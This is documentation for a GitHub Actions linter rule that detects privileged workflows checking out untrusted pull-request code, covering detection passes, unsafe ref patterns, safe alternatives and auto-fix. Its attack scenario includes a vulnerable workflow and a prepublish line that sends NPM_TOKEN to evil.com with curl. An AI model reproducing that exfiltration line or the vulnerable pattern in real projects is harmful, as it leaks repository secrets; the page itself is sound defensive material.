---
title: "Untrusted Checkout Rule"
weight: 1
---

### Untrusted Checkout Rule Overview

This rule detects when workflows with privileged triggers check out untrusted code from pull requests, which can allow attackers to exfiltrate secrets or compromise the repository.

The upstream CodeQL canonical query (`actions-untrusted-checkout-critical`) classifies this attack at `Security severity: 9.3 / Severity: error / Precision: very-high` and maps it to **CWE-829: Inclusion of Functionality from Untrusted Control Sphere**. sisakulint inherits the same attack model but currently emits **no in-message severity token** — the rule name has no `-critical`/`-medium` suffix and the diagnostic carries no `(critical)` token. Treat the CodeQL severity as the canonical reference until a sisakulint-side severity emit policy is finalized.

**Vulnerable Example:**

```yaml
name: PR Build
on: pull_request_target  # Dangerous: Runs in base repo context with secrets access

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checking out untrusted PR code
      - run: npm install  # Malicious code can access ${{ secrets.NPM_TOKEN }}
```

**Detection Output:**

```bash
vulnerable.yaml:9:16: checking out untrusted code from pull request in workflow with privileged trigger 'pull_request_target' (line 2). This allows potentially malicious code from external contributors to execute with access to repository secrets. Use 'pull_request' trigger instead, or avoid checking out PR code when using 'pull_request_target'. See https://sisaku-security.github.io/lint/docs/rules/untrustedcheckout/ for more details [untrusted-checkout]
      9 👈|          ref: ${{ github.event.pull_request.head.sha }}
```

### Security Background

#### Why is this dangerous?

GitHub Actions provides different trigger types that run with different permission levels:

| Trigger | Context | Secrets Access | Write Permissions |
|---------|---------|----------------|-------------------|
| `pull_request` | PR context (fork) | ❌ No | ❌ No (read-only) |
| `pull_request_target` | Base repo context | ✅ Yes | ✅ Yes |
| `issue_comment` | Base repo context | ✅ Yes | ✅ Yes |
| `workflow_run` | Base repo context | ✅ Yes | ✅ Yes |
| `workflow_call` | Inherits from caller | ✅ Yes (if caller has) | ✅ Yes (if caller has) |

**The Vulnerability:** When a workflow uses `pull_request_target`, `issue_comment`, `workflow_run`, or `workflow_call` triggers and explicitly checks out code from the pull request HEAD, it creates a **Poisoned Pipeline Execution** vulnerability. External attackers can:

1. **Exfiltrate Secrets:** Access `${{ secrets.* }}` values
2. **Modify Repository:** Push malicious commits or tags
3. **Compromise CI/CD:** Poison build artifacts or deployment pipelines
4. **Supply Chain Attack:** Inject malicious code into packages

#### Real-World Attack Scenario

```yaml
on: pull_request_target  # Attacker creates PR from fork
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Checks out attacker's code
      - run: npm publish  # Attacker's package.json contains:
                          # "scripts": { "prepublish": "curl https://evil.com?token=$NPM_TOKEN" }
        env:
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}  # Secret is exposed!
```

#### OWASP and CWE Mapping

- **CWE-829:** Inclusion of Functionality from Untrusted Control Sphere
- **OWASP Top 10 CI/CD Security Risks:**
  - **CICD-SEC-4:** Poisoned Pipeline Execution (PPE)

### Technical Detection Mechanism

The rule performs a three-pass analysis. The pseudocode below mirrors the actual call sites (`pkg/core/untrustedcheckout.go`) rather than a paraphrased sketch.

**Pass 1 (`VisitWorkflowPre`): collect privileged triggers and per-job narrowing**

```go
// Workflow-level triggers populate workflowTriggerInfos.
// JobTriggerAnalyzer then narrows per-job triggers using job-level
// if: conditions so that a guarded job only inherits the triggers
// its condition actually permits. Results are stored per-job in
// jobHasDangerousTrigger (NOT on a workflow-wide flag).
```

**Pass 2 (`VisitJobPre`): record dangerous-trigger position per job**

```go
// For every job whose narrowed trigger set intersects
// {pull_request_target, issue_comment, workflow_run, workflow_call},
// remember dangerousTriggerPos / dangerousTriggerName so later
// diagnostics can cite the originating trigger line:column.
```

**Pass 3 (`VisitStep`): inspect `actions/checkout` ref**

```go
// strings.HasPrefix(action.Uses.Value, "actions/checkout@")
// → isUntrustedPRRef(refValue) → IsUnsafeCheckoutRef(refValue)
//   does a CASE-INSENSITIVE substring scan against a list of
//   10 known unsafe substrings (see "Untrusted Ref Patterns"
//   below), AND treats any ${{ ... }} expression not present in
//   the safe-patterns allowlist as unsafe ("conservative
//   unknown expression" rule, see section below).
```

### Detection Logic Explanation

#### Dangerous Triggers Detected

1. **`pull_request_target`**
   - Runs in base repository context
   - Has access to all repository secrets
   - Can write to the base repository
   - Commonly misused for PR validation workflows

2. **`issue_comment`**
   - Triggered by comments on PRs from external contributors
   - Runs with write permissions
   - Can be abused if PR code is checked out

3. **`workflow_run`**
   - Triggered after another workflow completes
   - Runs in base repository context with secrets access
   - Used for trusted workflow separation, but dangerous if misused

4. **`workflow_call`**
   - Enables workflow reuse by allowing one workflow to call another
   - Inherits the security context of the calling workflow
   - Can be privileged if called from a privileged workflow (e.g., one triggered by `pull_request_target`)
   - Dangerous when it checks out untrusted PR code

#### Untrusted Ref Patterns

The rule's `IsUnsafeCheckoutRef` performs a **case-insensitive substring scan** over the literal text of the `ref:` input. Any ref whose value contains one of the following substrings is flagged. The list below is **exhaustive** — these are the 10 substrings the rule actually scans for (defined as `unsafePatternsLower` in `cachepoisoningutil.go`).

**Full GitHub-context expressions** (the canonical PR-head refs):

- `github.event.pull_request.head.sha`
- `github.event.pull_request.head.ref`
- `github.head_ref`

**Pull-request ref namespace**:

- `refs/pull/` (e.g. `refs/pull/123/head`)

**Dotted-suffix variants** (catches third-party action outputs that surface PR head info as `<step>.outputs.head_sha`, `<step>.outputs.head.ref`, etc.):

- `.head.sha`
- `.head.ref`
- `.head_sha`
- `.head_ref`

**Hyphenated variants** (third-party actions that expose PR head info via kebab-case identifiers):

- `head-sha`
- `head-ref`

> **Note on `head.label` and other head-derived refs**: `github.event.pull_request.head.label` is **not** in this substring list — the substring scan operates on literal text and does not interpret `*` wildcards (so a phrase like "any `github.event.*.head.*`" would be a routing fiction). However, `head.label` and any other `${{ ... }}` expression that is not on the safe-patterns allowlist is still flagged via the **conservative-unknown-expression** rule below. **Net coverage is therefore not weakened** by listing the substring scan exhaustively — `head.label` and similar head-derived expressions still flag, just through the conservative-unknown path rather than the substring scan.

In addition, a **conservative-unknown-expression** rule applies (see next section).

#### Conservative Unknown Expression

Any `${{ ... }}` expression in the `ref:` input that does **not** appear in the safe-patterns allowlist (see *Safe Patterns* below) is treated as unsafe. This is intentionally conservative: a custom expression that the rule has no static knowledge of will be flagged rather than silently allowed. If you maintain a custom expression that is provably safe, prefer rewriting it to one of the known-safe forms or — as a temporary measure — disabling the rule on that file with a comment directive.

#### Trigger Narrowing via Job-Level `if:`

The rule does not assume that a privileged workflow trigger means every job is privileged. The `JobTriggerAnalyzer` honors job-level `if:` conditions when computing the set of triggers under which each job is analyzed — e.g. a job guarded by `if: github.event_name == 'push'` inside a `pull_request_target`-triggered workflow is analyzed as a `push` job only, and the untrusted-checkout diagnostic is suppressed accordingly.

#### Safe Patterns

✅ **Safe Alternative 1: Use `pull_request` trigger**

```yaml
on: pull_request  # No secrets access, read-only permissions
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4  # Safe: defaults to PR merge commit
      - run: npm test  # No access to secrets
```

✅ **Safe Alternative 2: Don't checkout PR code**

```yaml
on: pull_request_target
jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      # No checkout - only use GitHub API
      - uses: actions/github-script@v7
        with:
          script: |
            github.rest.issues.addLabels({
              owner: context.repo.owner,
              repo: context.repo.name,
              issue_number: context.issue.number,
              labels: ['reviewed']
            })
```

✅ **Safe Alternative 3: Two-workflow pattern**

```yaml
# Workflow 1: Untrusted (pull_request trigger)
name: Build PR
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
      - uses: actions/upload-artifact@v4
        with:
          name: test-results
          path: results.json
```

```yaml
# Workflow 2: Trusted (workflow_run trigger)
name: Publish Results
on:
  workflow_run:
    workflows: ["Build PR"]
    types: [completed]
jobs:
  publish:
    runs-on: ubuntu-latest
    steps:
      # No checkout of PR code - only download artifacts
      - uses: actions/download-artifact@v4
      - run: publish-results  # Can safely use secrets here
        env:
          API_TOKEN: ${{ secrets.API_TOKEN }}
```

### False Positives

The rule has very few false positives because:

1. It only triggers when **both** conditions are met (privileged trigger + untrusted checkout).
2. Safe checkout patterns are explicitly allowed:
   - No `ref` parameter (defaults to trigger SHA — safe)
   - `ref: ${{ github.sha }}` (base branch — safe)
   - `ref: ${{ github.base_ref }}` (base branch of the PR)
   - `ref: ${{ github.event.pull_request.base.ref }}` (base ref of the PR)
   - `ref: ${{ github.event.pull_request.base.sha }}` (base SHA of the PR)
   - `ref: ${{ github.event.repository.default_branch }}` (repo default branch)
   - `ref: main` (literal branch names — safe)
   - `pull_request` trigger (no privileges — safe)

### Trigger Privilege Nuance (`issue_comment`)

Classifying `issue_comment` as privileged is correct in the sense that the workflow runs in the base-repo context and can resolve `secrets.*`. The exact scope of the resulting `GITHUB_TOKEN`, however, depends on the repository's "Workflow permissions" setting:

- **Newer repositories (created after February 2023)** default to read-only `GITHUB_TOKEN` (Contents/Metadata/Packages). Other API surfaces (issues, actions, pulls) return `403` unless the workflow declares a `permissions:` block explicitly.
- **Older repositories (created before February 2023)** default to `write-all`, in which case the token can mutate code, releases, and packages.

Both cases are exploitable — the *primary* danger of the rule is secret exposure, not token writability. This nuance is verified live: `sisaku-security/workflow-probe:results/issue-comment-privileged.md` (2026-05-24) shows `GITHUB_TOKEN` resolves with length 40 under `issue_comment`, can read contents but returns `403` on issues / actions / pulls under the new default.

### References

#### GitHub Documentation
- {{< popup_link2 href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections" >}}
- {{< popup_link2 href="https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target" >}}

#### Security Research
- {{< popup_link2 href="https://codeql.github.com/codeql-query-help/actions/actions-untrusted-checkout-critical/" >}}
- {{< popup_link2 href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/" >}}

#### OWASP Resources
- {{< popup_link2 href="https://owasp.org/www-project-top-10-ci-cd-security-risks/" >}}

### Auto-Fix

This rule supports automatic fixing. When you run sisakulint with the `-fix on` flag, it will automatically replace dangerous `ref` parameters with a safe default.

**Auto-fix behavior:**
- Replaces `ref: ${{ github.event.pull_request.head.sha }}` with `ref: ${{ github.sha }}`
- Replaces `ref: ${{ github.event.pull_request.head.ref }}` with `ref: ${{ github.sha }}`
- `github.sha` points to the base branch SHA, which is safe to checkout

**Example:**

Before auto-fix:
```yaml
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
```

After running `sisakulint -fix on`:
```yaml
on: pull_request_target
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.sha }}
```

**Note:** Auto-fix provides a safe default, but you should review whether your workflow actually needs to checkout code at all when using privileged triggers. Consider using the two-workflow pattern or removing the checkout step entirely if appropriate.

> ⚠️ **Mixed-literal ref auto-fix is destructive.** If the existing `ref:` value mixes a literal prefix with an expression (e.g. `ref: 'pr-${{ github.event.pull_request.head.sha }}'`), the auto-fix **replaces the entire string** with `${{ github.sha }}`, including the literal prefix. The auto-fix does not warn before doing this. Review the diff before applying `-fix on` if your `ref:` values are not pure expressions.

> Companion mitigation: combine the safer ref with `persist-credentials: false` on `actions/checkout`. The GitHub Security Lab "Preventing pwn-requests" research highlights `persist-credentials: false` as a critical defense in this attack class because it prevents the workflow's `GITHUB_TOKEN` from being persisted into the local `.git/config` where checked-out code (and any `pre-commit` hooks etc.) could read it.

> The CodeQL canonical query also recommends the **`safe to test` label workflow** pattern: a guard step that runs only when a maintainer has added a `safe to test` label, gating the privileged path behind manual review. This pattern has a known TOCTOU risk if the PR head is updated after labeling — pair it with `untrusted-checkout-toctou-critical`/`high` for full coverage.

### Remediation Steps

When this rule triggers:

1. **Use auto-fix for quick remediation**
   - Run `sisakulint -fix on` to automatically replace dangerous refs with safe defaults
   - Review the changes to ensure they meet your workflow requirements

2. **Assess if you need privileged access**
   - If you don't need secrets or write permissions, switch to `pull_request` trigger

3. **Use the two-workflow pattern**
   - Separate untrusted execution (PR code) from privileged operations (secrets access)

4. **Avoid checking out PR code**
   - If using `pull_request_target` for labeling or commenting, use GitHub API instead of checking out code

5. **Review existing workflows**
   - Audit all workflows using `pull_request_target`, `issue_comment`, `workflow_run`, or `workflow_call`
   - Ensure no PR code is executed in privileged contexts

### Additional Resources

For more information on securing GitHub Actions workflows, see:
- [GitHub Actions Security Best Practices](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) — GitHub Security Lab canonical research for this attack class
- [CodeQL: `actions-untrusted-checkout-critical`](https://codeql.github.com/codeql-query-help/actions/actions-untrusted-checkout-critical/) — upstream canonical query (Severity 9.3, CWE-829)
- [Living Off the Pipeline (LOTP) catalog](https://github.com/boostsecurityio/lotp) — broader catalog of CI/CD attack vectors referenced by the CodeQL query
- [OWASP CI/CD Security Top 10](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
